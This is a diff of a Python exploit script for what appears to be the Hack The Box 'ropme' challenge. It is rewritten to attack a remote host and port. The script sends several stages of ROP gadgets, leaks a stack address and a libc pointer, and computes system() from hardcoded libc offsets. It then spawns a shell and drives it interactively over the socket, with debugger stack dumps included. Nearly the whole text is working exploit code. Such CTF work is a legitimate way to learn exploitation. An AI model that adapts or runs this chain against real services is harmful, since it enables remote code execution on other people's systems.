@@ -7,15 +7,28 @@ from subprocess import *
 from fcntl import fcntl, F_GETFL, F_SETFL
 from os import O_NONBLOCK, read
 import signal
+import socket
 
-#Pre-calculated positions based on debugging binary
-#libc base 0x00007ffff7a3c000
-#libc stdin 0x00007ffff7dd38c0
-libc_stdin_distance  = 0x3978c0
-libc_poprdx_distance = 0x1b92
-libc_system_distance = 0x3f480
-libc_execve_distance = 0xb8630
+hostname = sys.argv[1]
+port = int(sys.argv[2])
+libc = sys.argv[3]
 
+#local kali build
+if libc == "2.25":
+	libc_system_distance = 0x40d60
+	__libc_start_dist	 = 0x20470 
+
+if libc == "2.24":
+	libc_system_distance = 0x3f480
+	__libc_start_dist	 = 0x201f0 
+	
+if libc == "2.23":
+	libc_system_distance = 0x45390
+	__libc_start_dist	 = 0x20740 
+
+__libc_start_ptr     = 0x601020
+
+puts 				 = 0x40063a
 def enable_sigpipe():
 
     signals = ('SIGPIPE', 'SIGXFZ', 'SIGXFSZ')
@@ -36,176 +49,264 @@ def build_bytes(rop_obj):
 		return ''.join(shellcode_list)
 
 	elif type(rop_obj) is str:
-		shellcode_str = str_to_lendian(string)
-		return struct.pack('<Q',shellcode_str)
+		#shellcode_str = str_to_lendian(rop_obj)
+		return str_to_lendian(rop_obj)
 
-def flush(subprocess_object):
-	subprocess_object.stdout.flush()
+def read_netbytes(recv_output, outputtype):	
+	sleep(.5)
+	response_list = ([hex(ord(i)) for i in recv_output])[::-1]
 
-def send_payload(subprocess_object, rop_string=None):
-	flush(subprocess_object)
-	if rop_string is not None:
-		rop_proc.stdin.write(rop_string)
-	rop_proc.stdin.write("\n")
-	sleep(1)
+	if outputtype == "memaddr":
+		response_list = [i for i in response_list if i != '0xa']
+		return int((''.join(['{:02X}'.format(int(i,16)) for i in response_list])), 16)
 
+	if outputtype == "bytes":
+		return [i for i in response_list if i != '0xa']
 
-def read_response(subprocess_object, byte_count=0):
-	if not byte_count:
-		return subprocess_object.stdout.readline()
-
-	else:
+def shell():
+	while True:
+		sleep(.1)
+		output = s.recv(2048)
+		print output
+		shell_command = raw_input("# ")
+		s.sendall(shell_command+"\n")	
+		if shell_command.lower() == "quit" or shell_command.lower() == "exit":
+			s.close()
+			break
 		sleep(.5)
-		return subprocess_object.stdout.read(byte_count)
 
-def read_localleak(stdout_bytes):
-	format_bytes = ([hex(ord(i)) for i in stdout_bytes])[::-1]
-	return int(''.join([i[2:] for i in format_bytes]), 16)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-rop_stage1 = []
-rop_stage1.append(0x0000000000000100) #<--- rid ptr on first loop
-rop_stage1.append(0x0000000000000000) #junk
-rop_stage1.append(0x0000000000000001) #junk
-rop_stage1.append(0x0000000000000001) #junk
-rop_stage1.append(0x0000000000601050) #junk
-rop_stage1.append(0x0000000000601050) #junk
-rop_stage1.append(0x0000000000601050) #junk
-rop_stage1.append(0x0000000000601050) #junk
-rop_stage1.append(0x00000000006010f0) # ret <--- rbp on first loop / pushed as rtn ptr
-rop_stage1.append(0x0000000000400626) # loop back to start 
-rop_stage1.append(0x00000000004006d3) # pop rdi
-rop_stage1.append(0x0000000000601060) #
-rop_stage1.append(0x000000000040063a) #puts
-rop_stage1.append(0x00000000004006d1) # pop rsi, pop r15 ; ret
-rop_stage1.append(0x0000000000000000) #junk
-rop_stage1.append(0x00007ffff7a7b480) # <--- system syscall
-
-rop_chain1 = build_bytes(rop_stage1)
-
-rop_proc = Popen("/root/hackthebox/ropme", 
-				stdin=PIPE, 
-				stdout=PIPE, 
-				shell=True, 
-				executable='/bin/bash', 
-				preexec_fn=enable_sigpipe())
+s.connect((hostname, port))
 
 banner = "ROP me outside, how 'about dah?\n"
-
-if read_response(rop_proc) == banner:
-	print "[+] Received banner."
-	raw_input("[+] Press enter to continue. ")
-
-else:
-	print "[-] Didn't receive banner. Exiting..."
-	sys.exit(0)
-
-print "[*] Sending stage 1 ROP gadgets with a length of %d" % len(rop_chain1)
-send_payload(rop_proc, rop_chain1)
-
-print "[+] Sent."
-
-if read_response(rop_proc) == banner:
-
-	print "[+] Succesfully sent that shit back into a loop."
-
-send_payload(rop_proc)
-
-print "[*] Reading address leak..."
+response1 = s.recv(len(banner))
 sleep(1)
+if response1 == banner:
+	print "[+] Received banner."
 
-output = read_response(rop_proc, 6)
-stdin_memleak = read_localleak(output)
 
-print "[+] Memory leak at %s." % hex(stdin_memleak)
+raw_input("[+] Press enter to continue: ")
+
+turtleshell = build_bytes(" sh    #")
+
+roplist1 = []
+roplist1.append(0x4141414141414141) #<--- rid ptr on first loop
+roplist1.append(0x4242424242424242) #
+roplist1.append(0x4343434343434343) #
+roplist1.append(0x4444444444444444) #
+roplist1.append(0x4545454545454545) #
+roplist1.append(0x4646464646464646) #
+roplist1.append(0x4747474747474747) #
+roplist1.append(0x4848484848484848) #
+roplist1.append(0x601174) # ret <--- rbp on first loop / pushed as rtn ptr
+roplist1.append(0x000000000040062e) #
+roplist1.append(turtleshell		  ) # <--
+roplist1.append(turtleshell		  ) #    |
+roplist1.append(turtleshell		  ) #    |
+roplist1.append(turtleshell		  ) #	 |
+roplist1.append(turtleshell		  ) #	 |
+roplist1.append(turtleshell		  ) #	 |
+roplist1.append(turtleshell		  ) #	 |
+roplist1.append(turtleshell		  ) #  	 |--- clears stack of 0xa which will
+roplist1.append(turtleshell		  ) # 	 |	  prevent subsequent ROP instructions
+roplist1.append(turtleshell		  ) #	 |	  from fgets() calls
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(turtleshell		  ) #
+roplist1.append(0xdeadbeef) #
+roplist1.append(0xdeafbabe) #
+roplist1.append(0x4141414141414141) #
+
+ropchain1 = build_bytes(roplist1)
+
+print "[*] Sending stage 1 ROP gadgets with a length of %d" % len(ropchain1)
+raw_input("[+] Press enter to continue: ")
+s.sendall(ropchain1+"\n")
+response1 = s.recv(1024)
+
+if response1 == banner:
+	print "[+] Received banner."
+
+
+roplist2 = []
+roplist2.append(0x0000000000000000) #
+roplist2.append(0x0000000000000000) #
+roplist2.append(0x0000000000000000) #
+roplist2.append(0x0000000000000000) #
+roplist2.append(0x0000000000000000) #
+roplist2.append(0x0000000000000000) #
+roplist2.append(0x0000000000000000) #
+roplist2.append(0x0000000000000000) #
+roplist2.append(0x601250)    		#
+roplist2.append(0x00000000004006d3) # pop rdi; ret 
+roplist2.append(0x601185)           # sets RDX to 601134
+roplist2.append(0x000000000040063a) # <---- loop to puts
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+roplist2.append(0x4141414141414141) #
+
+print "[*] Sending ze stage 2 ROP gadgets..."
+sleep(.5)
+ropchain2 = build_bytes(roplist2)
+s.sendall(ropchain2+"\n")
+response2 = s.recv(1024)
+	
+if len(response2) > 0:
+	response2 = response2[0:5]
+	stack_leak = read_netbytes(response2, "memaddr")
+	stack_leak = hex(stack_leak) + "00"
+	stack_leak = int(stack_leak,16)
+	#should return the bottom of the stack
+	print "[+] Memory stack leak at %x" % stack_leak
+
+
+
+#Build 3rd stage ROP chain
+stack_leak = stack_leak - 0x100
+
+binsh = build_bytes("sh     #")
+
+roplist3 = []
+roplist3.append(0x0000000000000000) # <---- 
+roplist3.append(0x0000000000000000) #
+roplist3.append(0x0000000000000000) #
+roplist3.append(0x0000000000000000) #
+roplist3.append(0x0000000000000000) #
+roplist3.append(0x0000000000000000) #
+roplist3.append(0x0000000000000000) #
+roplist3.append(0x0000000000000000) #
+roplist3.append(0x60115a)		    # 
+roplist3.append(0x00000000004006d3) # pop rdi
+roplist3.append(__libc_start_ptr)   # 
+roplist3.append(0x000000000040063a) # <---- loop to puts
+
+
+print "[*] Sending ze stage 3 ROP gadgets to get libc start pointer..."
+sleep(.5)
+raw_input("[+] Press enter to continue: ")
+
+ropchain3 = build_bytes(roplist3)
+
+print "[+] Sending third stage."
+s.sendall(ropchain3+"\n")
+sleep(.5)
+response3 = s.recv(1024)
+response3 = response3[0:7]
+
+libc_start_main_leak = read_netbytes(response3, "memaddr") 
+
+print "[+] Libc start main leak at %s" % hex(libc_start_main_leak)
+
 print "[*] Doin' math 'n' shit..."
 
-libc_base = stdin_memleak - libc_stdin_distance
+libc_base = libc_start_main_leak - __libc_start_dist
 print "\t[+] Libc base at addr: %s" % hex(libc_base)
 
-libc_pop_rdx = libc_base + libc_poprdx_distance
-print "\t[+] Pop rdx gadget at addr: %s" % hex(libc_pop_rdx)
-
-libc_system_scall = libc_base + libc_execve_distance
-print "\t[+] System syscall gadget at addr: %s" % hex(libc_system_scall)
+system = libc_base + libc_system_distance
+print "\t[+] System syscall gadget at addr: %s" % hex(system)
 
 
-#Start build of second stage ROP shellcode
-print "[*] Building ze stage 2 ROP gadgets..."
-sleep(1)
+#Build 3rd stage ROP chain
 
-shellcode = str_to_lendian("//bin/sh")
 
-rop_list2 = []
-rop_list2.append(shellcode) 			# <---- 0x6010b0 
-rop_list2.append(0x0000000000000000) #
-rop_list2.append(0x4141414141414141) #
-rop_list2.append(0x4141414141414141) #
-rop_list2.append(0x4141414141414141) #
-rop_list2.append(0x4141414141414141) #
-rop_list2.append(0x4141414141414141) #
-rop_list2.append(0x4141414141414141) #
-rop_list2.append(0x4141414141414141) #
-rop_list2.append(0x00000000004006d3) # pop rdi; ret <---- rbp on heap
-rop_list2.append(0x00000000006010b0) # shellcode  string at 0x6010b0
-rop_list2.append(0x00000000004006d1) # pop rsi; pop r15; ret
-rop_list2.append(0x0000000000000000) # clear reg
-rop_list2.append(0x0000000000000000) # clear reg
-rop_list2.append(libc_pop_rdx)
-rop_list2.append(0x0000000000000000) # clear reg
-rop_list2.append(libc_system_scall)	# pop dat shell
+roplist4 = []
+roplist4.append(binsh) # <---- 
+roplist4.append(0x0000000000000000) #
+roplist4.append(0x0000000000000000) #
+roplist4.append(0x0000000000000000) #
+roplist4.append(0x0000000000000000) #
+roplist4.append(0x0000000000000000) #
+roplist4.append(0x0000000000000000) #
+roplist4.append(0x0000000000000000) #
+roplist4.append(0x60115a) #
+roplist4.append(0x000000000040064e) # mov rdx, stin ; lea rax,[rbp-0x40]
+roplist4.append(0x60111a)		    # 
+roplist4.append(0x000000000040064e) # mov rdx, stin ; lea rax,[rbp-0x40] ; mov esi,0x1f4 ; mov rdi,rax; call fgets
+roplist4.append(stack_leak - 0x40 ) # ret to "pop rdi" instruction on stack on stack
+roplist4.append(0x000000000040064e) #
+roplist4.append(0x000000000040064e) #
+ropchain4 = build_bytes(roplist4)
 
-rop_chain2 = build_bytes(rop_list2)
 
-print "[+] Sending second stage."
-send_payload(rop_proc, rop_chain2)
-print "[+] Poppin dat shell."
+print "[+] Sent stage 4 ROP gadgets."
+s.sendall(ropchain4+"\n")
+sleep(.5)
 
-#Switch to non-blocking read
-flags = fcntl(rop_proc.stdout, F_GETFL)
-fcntl(rop_proc.stdout, F_SETFL, flags | O_NONBLOCK)
+raw_input("[+] Press enter to continue: ")
+
+roplist5 = []
+roplist5.append(0x4141414141414141) #
+roplist5.append(0x4141414141414141) #
+ropchain5 = build_bytes(roplist5)
+twobytes = struct.pack('<H', 0x00)
+ropchain5 += twobytes
+
+print "[+] Sending 5th stage."
+raw_input("[+] Press enter to continue: ")
+s.sendall(ropchain5+"\n")
+sleep(.5)
+
+roplist6 = []
+roplist6.append(0x0000000000000000) #
+roplist6.append(0x0000000000000000) #
+roplist6.append(0x0000000000000000) #
+roplist6.append(0x0000000000000000) #
+roplist6.append(0x0000000000000000) #
+roplist6.append(0x0000000000000000) #
+roplist6.append(0x0000000000000000) # pop rbp ; ret <----ret pointer
+roplist6.append(0x00000000004006d3) # 0x40 (pop rdi; ret )
+roplist6.append(stack_leak + 0x50 ) # 0x38
+roplist6.append(0x0000000000400590) # 0x28 (pop rbp ; ret )
+roplist6.append(stack_leak)			# 0x20
+roplist6.append(system)				# 0x18 
+
+#roplist4.append(0x000000000040064e) #
+ropchain6 = build_bytes(roplist6)
+
+print "[+] Sending 5th stage."
+raw_input("[+] Press enter to continue: ")
+
+s.sendall(ropchain6+"\n")
+sleep(.5)
 
 while True:
+
 	shell_command = raw_input("# ")
-	rop_proc.stdin.write(shell_command+"\n")	
-	sleep(0.1)
-
-	try:
-		print read(rop_proc.stdout.fileno(), 1024),
-
-	except OSError:
-		continue
 
 
+	s.sendall(shell_command+"\n")	
+	sleep(.1)
+	output = s.recv(2048)
+	print output
+	if shell_command.lower() == "quit" or shell_command.lower() == "exit":
+		s.close()
+		break
+	sleep(.1)
 
-	
-#libc base stdin - 0x3978c0 = libcB
-#libcB + 0x1b92 = pop rdx
 
-# python -c 'print hex(0x7fffffffe250 - 0x7fffffffe0f0)'
-# 0x160
 
-# 0x7fffffffe0f0:	0x00007ffff7aafa30	0x00007ffff7dd38c0
-# 0x7fffffffe100:	0x00007ffff7dd0440	0x000000000000000a
-# 0x7fffffffe110:	0x00000000006024a9	0x00000000000001f3
-# 0x7fffffffe120:	0x00007ffff7ab0b32	0x0000000000000000
-# 0x7fffffffe130:	0x0000000000000000	0x00007fffffffe1d8
-# 0x7fffffffe140:	0x00007ffff7aa454a	0x00007ffff7dd0440
-# 0x7fffffffe150:	0x00007fffffffe1d8	0x0000000100000000
-# 0x7fffffffe160:	0x0000000000000000	0x00007ffff7dd4600
-# 0x7fffffffe170:	0x00007ffff7dd38c0	0x0000000000000000
-# 0x7fffffffe180:	0x00007fffffffe1d8	0x00007fffffffe2f0
-# 0x7fffffffe190:	0x0000000000000000	0x0000000000000000
-# 0x7fffffffe1a0:	0x00007ffff7aa33eb	0x0000000000000000
-# 0x7fffffffe1b0:	0x00007fffffffe218	0x0000000000400530
-# 0x7fffffffe1c0:	0x0000000000400666	0x00007ffff7dd5770
-# 0x7fffffffe1d0:	0xffffe1d100000100	0x0000000000000000
-# 0x7fffffffe1e0:	0x0000000000000001	0x0000000000000001
-# 0x7fffffffe1f0:	0x0000000000601050	0x0000000000601050
-# 0x7fffffffe200:	0x0000000000601050	0x0000000000601050
-# 0x7fffffffe210:	0x00000000006010f0	0x00000000006010f0
-# 0x7fffffffe220:	0x00000000004006d3	0x0000000000601060
-# 0x7fffffffe230:	0x000000000040063a	0x00000000004006d1
-# 0x7fffffffe240:	0x0000000000000000	0x0000000000000000
-# 0x7fffffffe250:	0x00007ffff7a7b480	0x00007fffffff000a
-# 0x7fffffffe260:	0x0000000000000000	0x0000000000000000
-# 0x7fffffffe270:	0x7b593d40fb11a698	0x7b592df4ba63a698
